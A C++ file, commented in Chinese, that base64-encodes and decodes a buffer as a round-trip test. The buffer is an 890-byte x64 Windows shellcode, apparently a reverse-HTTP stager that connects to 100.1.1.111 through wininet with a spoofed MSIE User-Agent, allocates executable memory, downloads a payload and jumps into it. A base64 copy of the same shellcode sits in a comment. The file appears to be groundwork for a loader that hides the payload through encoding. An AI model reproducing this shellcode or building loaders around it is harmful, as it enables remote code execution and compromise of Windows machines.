#include <iostream>
#include <vector>
#include <string>
#include <stdexcept>
#pragma comment(lib, "WinDivert.lib")
#define ClickNumber 20
using namespace std;

static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


// base64编码函数, 将 unsigned char buf[] 编码为 base64 字符串
std::string base64_encode(unsigned char buf[], unsigned int bufLen)
{
    std::string output = "";
    int val = 0, valb = -6;
    for (int i = 0; i < bufLen; i++)
    {
        unsigned char c = buf[i];
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0)
        {
            output.push_back(base64_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6)
    {
        output.push_back(base64_table[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (output.size() % 4)
    {
        output.push_back('=');
    }
    return output;
}

// Base64解码函数, 将 base64 字符串解码为 unsigned char buf[]
std::vector<unsigned char> base64_decode(const std::string& encoded_string)
{
    // Create lookup table for base64 decoding
    static unsigned char lookup[256];
    static bool initialized = false;
    
    if (!initialized) {
        // Initialize all to invalid
        for (int i = 0; i < 256; i++) {
            lookup[i] = 0xFF;
        }
        
        // Set values for base64 characters
        for (int i = 0; i < 64; i++) {
            lookup[(unsigned char)base64_table[i]] = i;
        }
        initialized = true;
    }
    
    std::vector<unsigned char> out;
    out.reserve(encoded_string.length() * 3 / 4);
    
    int val = 0;
    int valb = -8;
    
    for (char c : encoded_string) {
        if (c == '=') {
            // Padding character, skip
            continue;
        }
        
        unsigned char x = lookup[(unsigned char)c];
        if (x == 0xFF) {
            // Invalid character, skip
            continue;
        }
        
        val = (val << 6) | x;
        valb += 6;
        
        if (valb >= 0) {
            out.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    
    return out;
}



int main()
{
    /* length: 890 bytes */
    unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x3a\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x6b\x47\x66\x45\x00\x87\x4b\xeb\xca\x4e\xae\x1d\xd0\x95\x25\x3d\x57\x1f\xe3\x6d\x8f\xbe\xc2\x2b\x00\x88\x8f\xf2\x1d\x90\xbc\x60\xbd\xe2\xa3\xd3\x15\x66\x6b\x90\x62\x3e\x36\x38\x81\x6c\xba\xfd\x4b\x49\xf2\x9b\x57\x91\x00\x77\xb7\x27\x92\x46\x72\x73\xe3\x7c\x5c\xc7\x14\x24\x11\xdc\x18\xaf\x32\x8e\x29\xb4\x7c\x46\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x41\x55\x3b\x20\x4e\x50\x30\x38\x29\x0d\x0a\x00\xb0\xf3\x86\x41\x3a\xf2\xfa\xe6\xfd\x38\x50\x6b\x4d\x79\x05\x5d\x78\x0f\xb3\x26\xc9\xc1\xd4\x20\xef\xfe\xc1\x1c\x49\xb6\x99\x8a\x73\x5b\xf4\x6d\x52\xe7\xec\xf8\x94\xc4\x9b\x17\xe8\xe7\x53\xa4\xe9\xd1\x34\x2f\xb3\xab\x2a\xd4\x2c\xc9\x62\x42\x64\xf5\xfe\x0d\xbe\x3b\x5c\x3a\x24\xc5\x28\x10\x7b\xa1\xc7\x8c\xbd\x24\x20\x0a\x41\x1a\xc7\xa5\xb7\x10\xbd\xf1\xb9\xd8\x43\x7c\x2a\x89\xdf\xe6\x7d\x74\x60\x2b\xfc\x8c\x03\xac\x3b\x93\xe8\x7c\x84\x7a\x6b\xb9\xc2\xdd\x05\x7f\xc5\x99\x49\xf5\xe9\x72\x8f\xe6\x6a\x03\x2f\x90\xe9\x62\x71\xb4\x73\xc6\xce\x49\x6d\x04\x97\x39\x5f\x41\xe3\xf7\xea\xec\x54\xa4\x8e\x6b\x74\x15\x51\x5c\x21\x2d\xe3\x81\x1d\xde\x88\x8b\x22\x26\x3c\xa6\x80\x1b\x4b\xdc\x33\x54\x8c\x19\xa2\x84\xcd\xee\x95\xd0\x26\x2d\x54\xa0\x3a\x75\xe6\xca\xce\xc0\xe7\x3f\x01\x45\xa2\x51\x1e\x4f\x92\x65\xa1\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x30\x2e\x31\x2e\x31\x2e\x31\x31\x31\x00\x00\x01\x86\xa0";

    cout << "准备测试base64编码解码" << endl;
    // string b64_encoded = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuDoBAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L2tHZkUAh0vryk6uHdCVJT1XH+Ntj77CKwCIj/IdkLxgveKj0xVma5BiPjY4gWy6/UtJ8ptXkQB3tyeSRnJz43xcxxQkEdwYrzKOKbR8RgBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMDsgTUFBVTsgTlAwOCkNCgCw84ZBOvL65v04UGtNeQVdeA+zJsnB1CDv/sEcSbaZinNb9G1S5+z4lMSbF+jnU6Tp0TQvs6sq1CzJYkJk9f4NvjtcOiTFKBB7oceMvSQgCkEax6W3EL3xudhDfCqJ3+Z9dGAr/IwDrDuT6HyEemu5wt0Ff8WZSfXpco/magMvkOlicbRzxs5JbQSXOV9B4/fq7FSkjmt0FVFcIS3jgR3eiIsiJjymgBtL3DNUjBmihM3uldAmLVSgOnXmys7A5z8BRaJRHk+SZaEAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zEwMC4xLjEuMTExAAABhqAA";

    string b64_encoded = base64_encode(buf, sizeof(buf));
    cout << "编码后的数据: " << b64_encoded << endl;
    // 测试解码
    vector<unsigned char> decoded = base64_decode(b64_encoded);
    cout << "解码后的数据: ";
    for (unsigned char c : decoded) {
        cout << c;
    }
    cout << endl;
    // 对比解码后的数据是否与原数据一致
    if (decoded.size() != sizeof(buf) || memcmp(&decoded[0], buf, sizeof(buf)) != 0) {
        cout << "解码后的数据与原数据不一致" << endl;
    } else {
        cout << "解码后的数据与原数据一致" << endl;
    }
   

    return 0;
}